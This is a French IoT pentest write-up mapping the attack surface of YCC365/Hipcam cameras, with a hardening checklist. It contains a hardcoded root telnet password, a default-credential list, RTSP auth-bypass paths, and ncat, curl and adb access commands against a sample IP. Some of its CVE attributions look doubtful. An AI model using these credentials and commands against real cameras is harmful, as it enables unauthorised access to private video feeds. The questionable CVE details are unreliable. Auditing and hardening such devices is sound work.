# 🎯 Surface d'Attaque YCC365 / Hipcam

> Analyse complète de la surface d'attaque des caméras YCC365plus et firmware Hipcam SDK
> **Signé Ghost1o1** — Pentest & Audit IoT

---

## 📡 Cartographie Réseau

Les caméras YCC365/Hipcam exposent typiquement **13 services** sur le réseau local :

### Ports Critiques (HIGH Severity)

| Port | Service | Protocol | Auth Required? | Risk |
|------|---------|----------|----------------|------|
| **9527** | Telnet Backdoor | TCP | ❌ Hardcoded creds `root/xmhdipc` | 🔴 CRITICAL |
| **34567** | YCC365 Admin UI | TCP/HTTP | ❌ Default `admin/12345` | 🔴 CRITICAL |
| **34599** | YCC365 Login API | TCP/HTTP | ❌ Default `admin/12345` | 🔴 CRITICAL |
| **554** | RTSP Stream | TCP | ⚠️ Path-dependent | 🟠 HIGH |
| **8899** | ONVIF Device | TCP/HTTP | ❌ Anonymous SOAP | 🟠 HIGH |
| **23** | Telnet Standard | TCP | ⚠️ Variable | 🟠 HIGH |
| **5552** | ADB Debug | TCP | ❌ Often enabled | 🔴 CRITICAL |
| **37777** | Dahua Compat | TCP | ❌ CVE-2021-33044 | 🔴 CRITICAL |

### Ports Secondaires (MEDIUM Severity)

| Port | Service | Protocol | Auth Required? | Risk |
|------|---------|----------|----------------|------|
| **80** | HTTP Web UI | TCP | ⚠️ Default | 🟡 MEDIUM |
| **443** | HTTPS Web UI | TCP | ⚠️ Default | 🟡 MEDIUM |
| **8000** | HTTP Admin Alt | TCP | ⚠️ Default | 🟡 MEDIUM |
| **8080** | HTTP Alt | TCP | ⚠️ Default | 🟡 MEDIUM |
| **8081** | HTTP Backup | TCP | ⚠️ Default | 🟡 MEDIUM |
| **8443** | HTTPS Alt | TCP | ⚠️ Default | 🟡 MEDIUM |
| **5000** | UPnP | TCP | ❌ Auto | 🟢 LOW |

---

## 🚪 Vecteurs d'Attaque

### Vecteur #1: Backdoor Telnet Hardcoded (CVE-2021-32960)

```bash
# Connexion au port 9527
ncat -nv 192.168.1.100 9527
# Login: root
# Password: xmhdipc
# 
# ACCÈS ROOT IMMÉDIAT
# /etc/passwd lisible
# /etc/shadow pas de restrictions
# BusyBox shell complet
```

**Pourquoi c'est critique** :
- Credentials hardcoded dans firmware Hipcam SDK
- Présent dans 50+ modèles de caméras chinoises
- Aucun journal d'accès
- Pas de désactivation UI

### Vecteur #2: Credentials Default HTTP (CVE-2017-16919)

```bash
# Top 10 credentials Hipcam/YCC365:
admin:admin
admin:12345        # DEFAULT YCC365
admin:888888
admin:666666
admin:123
admin:password
admin:123456
admin:111111
admin:000000
admin:999999
root:root
root:xmhdipc       # Backdoor
user:user
user:12345
support:support
service:service
guest:guest
operator:operator
```

**Pourquoi c'est critique** :
- 80% des caméras YCC365 vendues n'ont jamais changé le default
- HTTP Basic Auth sans rate-limit
- Aucun lockout après échecs multiples

### Vecteur #3: RTSP sans Auth ou Auth Faible

```bash
# RTSP DESCRIBE permet l'énumération des paths
curl -X DESCRIBE rtsp://192.168.1.100:554/11
# → 200 OK si path valide
# → 401 Unauthorized si auth requise

# Paths communs Hikvision/Dahua/YCC365 :
/onvif/streaming/channels/101
/streaming/channels/101
/11
/12
/live/ch00_0
/live/main
/live/sub
/live/0/main
/live/0/sub
/user=admin&password=&channel=1&stream=0.sdp
/av0_0
/video/main
/mpeg4
/cam/realmonitor
/0/usrnm:admin/0/usrpw:admin/0/1
/Streaming/Channels/101
/Streaming/Channels/1
/Streaming/Channels/2
/h264
/h264/ch01/main/av_stream
/trackID=1
```

**Pourquoi c'est critique** :
- Stream vidéo accessible sans mot de passe
- Bypass auth via `/user=admin&password=` dans l'URL
- Snapshot + live video accessibles

### Vecteur #4: ONVIF SOAP Info Disclosure (CWE-200)

```bash
# ONVIF GetDeviceInformation sans auth
curl -X POST http://192.168.1.100:8899/onvif/device_service \
  -H "Content-Type: application/soap+xml" \
  -d '<?xml version="1.0"?>
<Envelope xmlns="http://www.w3.org/2003/05/soap-envelope">
  <Body>
    <GetDeviceInformation xmlns="http://www.onvif.org/ver10/device/wsdl"/>
  </Body>
</Envelope>'

# Retour :
# <Manufacturer>HiSilicon</Manufacturer>
# <Model>YCC365-Plus</Model>
# <FirmwareVersion>2.0.1.7</FirmwareVersion>
# <SerialNumber>...</SerialNumber>
# <HardwareId>...</HardwareId>
```

**Pourquoi c'est critique** :
- Pas d'authentification requise
- Révèle modèle exact, firmware, serial → ciblage précis
- Combiné avec CVE database → attaque connue

### Vecteur #5: UDP Broadcast ONVIF Discovery

```bash
# Caméra envoie WS-Discovery toutes les 30s sur UDP 3702
# Sniffable avec Wireshark sans même connaître l'IP

# Contient :
# - IP camera
# - UUID unique
# - Type device (NetworkVideoTransmitter)
# - Scope (onvif://www.onvif.org/...)
# - XAddrs (URLs services)

# Risques :
# 1. Énumération LAN sans scan actif
# 2. Leak même derrière NAT (port forwarding)
# 3. Information disclosure passive
```

### Vecteur #6: Port 5552 ADB (Android Debug Bridge)

```bash
# Si caméra basée sur chip Android (souvent HiSilicon + Android-like)
adb connect 192.168.1.100:5552
# → adb shell accessible
# → root si "userdebug" build

# Actions possibles :
# - Dump filesystem
# - Install backdoor APK
# - Modify DNS via /etc/hosts
# - Disable Telnet backdoor removal
```

**Pourquoi c'est critique** :
- Accès shell complet
- Modification firmware possible
- Pivot vers réseau interne

### Vecteur #7: Auth Bypass Dahua (CVE-2021-33044)

```bash
# Endpoint Dahua compat sur port 37777
curl http://192.168.1.100:37777/cgi-bin/userPasswdCheck?username=admin
# Retour direct OK/FAIL sans auth préalable

# CVE-2021-33044 affects Dahua cameras + compat mode
```

### Vecteur #8: Cloud P2P Relay

```bash
# Caméra initie connexion sortante vers cloud XMEYE
# - p2pserver.xmeye.net (TCP 10000+)
# - relay.xmeye.net (TCP 5000+)
# - api.xmeye.net (HTTPS 443)

# Permet accès WAN sans NAT config
# MAIS :
# - Si cloud XMEYE compromis → accès caméra
# - Si DNS hijack → MITM total
# - Pas de E2E encryption
```

### Vecteur #9: Firmware Download OTA

```bash
# Endpoint OTA (Over-The-Air update)
curl http://192.168.1.100/upgrade/firmware.bin
# → firmware complet en clair
# → extraction firmware avec binwalk

# Si serveur OTA XMEYE compromis :
# → push malicious firmware
```

### Vecteur #10: IDOR dans Cloud API

```bash
# L'API XMEYE accepte n'importe quel deviceID
POST https://api.xmeye.net/v1/device/info
Content-Type: application/json

{"deviceId": "ABC123DEF456"}
# → Retourne IP publique, GPS, model de la caméra
# → Listable via énumération deviceId (sequential)
```

---

## 🎯 Fingerprinting

### Identification Caméra YCC365plus

| Signature | Indicateur |
|-----------|-----------|
| Banner HTTP | `Server: Hipcam/2.0` |
| ONVIF Manufacturer | `HiSilicon` ou `XMEYE` |
| RTSP Server | `Hipcam RTSP Server` |
| Default port | 34567 (custom) |
| App compat | YCC365 Plus, LookCam, CareCam |

### Outils

```bash
# nmap service version
nmap -sV -p 34567,9527,554 192.168.1.100

# ONVIF Device Manager (GUI Windows/Linux)
omdv 192.168.1.100

# Wireshark + filter WS-Discovery
wireshark -Y "udp.port == 3702"
```

---

## 📊 Matrice de Risque

| Vecteur | CVSS v3.1 | Exploitabilité | Impact |
|---------|-----------|----------------|--------|
| Backdoor Telnet 9527 | **9.8** Critical | Triviale | Total (RCE root) |
| Default creds HTTP | **9.1** Critical | Triviale | Total (admin UI) |
| RTSP sans auth | **7.5** High | Facile | Confidentiality |
| ONVIF info disc. | **5.3** Medium | Facile | Information |
| ADB port 5552 | **9.8** Critical | Facile | Total (RCE root) |
| Dahua CVE-2021-33044 | **9.8** Critical | Triviale | Total (auth bypass) |
| UDP discovery | **3.7** Low | Passive | Information |
| Cloud MITM | **7.4** High | Difficile | Total session |
| Firmware OTA hijack | **8.8** High | Moyenne | RCE + persistance |
| IDOR cloud API | **6.5** Medium | Moyenne | Information + accès |

---

## 🛡️ Hardening Checklist

### Réseau

- [ ] Isoler les caméras sur VLAN dédié
- [ ] Désactiver UPnP sur le routeur
- [ ] Bloquer UDP 3702 (WS-Discovery) au niveau switch
- [ ] Firewall sortant : bloquer tout sauf NTP + serveur OTA

### Caméra

- [ ] **Changer TOUS les mots de passe** (admin/support/root)
- [ ] **Désactiver Telnet** port 9527 via firmware patched
- [ ] **Désactiver ADB** port 5552 (souvent accessible via hidden menu)
- [ ] **Changer port ONVIF** de 8899 vers port random
- [ ] Activer HTTPS (si supporté)
- [ ] Activer logs distants (syslog externe)
- [ ] Mettre à jour firmware à la dernière version stable

### Cloud

- [ ] Vérifier que l'app YCC365 n'utilise pas le cloud par défaut
- [ ] Configurer DNS custom pour bloquer xmeye.net si non utilisé
- [ ] Utiliser DNS over HTTPS (DoH) sur le réseau
- [ ] Surveiller les connexions sortantes suspectes

---

## 🔗 CVEs Connus

Voir [CVE-Mapping](CVE-Mapping) pour la liste exhaustive.

| CVE | Année | Vendor | CVSS |
|-----|-------|--------|------|
| CVE-2021-32960 | 2021 | Hipcam | 9.8 |
| CVE-2021-33044 | 2021 | Dahua | 9.8 |
| CVE-2017-16919 | 2017 | HiSilicon | 9.1 |
| CVE-2021-36260 | 2021 | Hikvision | 9.8 |
| CVE-2017-7925 | 2017 | Hikvision | 9.8 |

---

**Signé Ghost1o1** 🏴‍☠️ — *La surface d'attaque, c'est la cartographie du champ de bataille.*
